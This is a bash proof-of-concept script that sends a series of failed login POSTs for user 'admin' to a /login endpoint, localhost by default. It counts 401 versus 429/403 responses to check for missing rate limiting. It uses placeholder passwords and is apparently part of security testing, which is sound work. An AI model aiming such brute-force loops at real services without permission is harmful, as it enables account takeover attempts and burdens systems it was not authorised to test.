#!/bin/bash

# POC: Brute Force Attack - No Rate Limiting on Login Endpoint
# This script demonstrates that the /login endpoint accepts unlimited failed login attempts
# without implementing any rate limiting, IP throttling, or brute force protection

TARGET_URL="${1:-http://localhost:5003/login}"
NUM_ATTEMPTS="${2:-20}"

echo "=========================================="
echo "Brute Force Vulnerability POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "Attempts: $NUM_ATTEMPTS"
echo "=========================================="
echo ""

# Track statistics
success_count=0
total_requests=0
start_time=$(date +%s)
rate_limit_detected=0

echo "[*] Starting brute force attempts..."
echo ""

for i in $(seq 1 $NUM_ATTEMPTS); do
    attempt_num=$(printf "%02d" $i)
    password="attempt_password_$i"
    
    # Make login request
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"admin\",\"password\":\"$password\"}")
    
    # Extract HTTP status code and body
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | head -n -1)
    
    # Check for rate limiting indicators
    if [[ "$http_code" == "429" ]]; then
        rate_limit_detected=1
        echo "[!] Attempt $attempt_num: HTTP $http_code (Rate limited!) - PROTECTION DETECTED"
        break
    elif [[ "$http_code" == "401" ]]; then
        ((success_count++))
        echo "[✓] Attempt $attempt_num: HTTP $http_code (Unauthorized - accepted)"
    elif [[ "$http_code" == "403" ]]; then
        echo "[!] Attempt $attempt_num: HTTP $http_code (Forbidden - possible rate limiting)"
        rate_limit_detected=1
        break
    else
        echo "[?] Attempt $attempt_num: HTTP $http_code (Unexpected response)"
    fi
    
    ((total_requests++))
done

end_time=$(date +%s)
elapsed_s=$((end_time - start_time))

echo ""
echo "=========================================="
echo "Results Summary"
echo "=========================================="
echo "Total Requests: $total_requests"
echo "Successful (401): $success_count"
echo "Time Elapsed: ${elapsed_s}s"
echo ""

if [[ $rate_limit_detected -eq 1 ]]; then
    echo "[✓] Rate limiting DETECTED - Vulnerability MITIGATED"
    exit 0
elif [[ $success_count -ge 10 ]]; then
    echo "[✗] VULNERABILITY CONFIRMED: NO RATE LIMITING DETECTED"
    echo "    Application accepted $success_count failed login attempts without blocking"
    exit 0
else
    echo "[?] Inconclusive - Possible rate limiting or other protection"
    exit 1
fi